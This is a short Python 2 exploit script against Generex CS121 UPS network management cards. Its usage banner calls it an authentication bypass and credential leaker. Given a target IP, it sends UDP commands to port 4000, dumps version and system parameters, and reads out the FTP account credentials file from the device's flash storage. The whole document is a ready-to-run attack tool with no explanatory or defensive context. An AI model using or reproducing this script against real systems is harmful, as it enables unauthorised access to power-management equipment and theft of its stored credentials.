#!/usr/bin/env python
import sys, socket

def _recv(s, timeout=2):
	ret = ''
	old_timeout = s.gettimeout()
	try:
		s.settimeout(timeout)
		while True:
			data = s.recv(4096)
			if not data: 
				break
			ret += data
	except socket.error:
		pass
	s.settimeout(old_timeout)
	return ret

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print "Generex CS121 UPS authentication bypass and credential leaking"
		print "usage: {0} <IP>".format(sys.argv[0])
		sys.exit(1)
	server = (sys.argv[1], 4000)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.settimeout(5)
		s.sendto('<VERSION>', server)
		print _recv(s)
		s.sendto('show syspar', server)
		print _recv(s, 2)
		s.sendto('start', server)
		_recv(s)
		s.sendto('cd /flash', server)
		s.sendto('type ftp_accounts.txt', server)
		print _recv(s, 2)
	except socket.error, msg:
		print 'socket error: {0}'.format(msg)
		sys.exit(1)

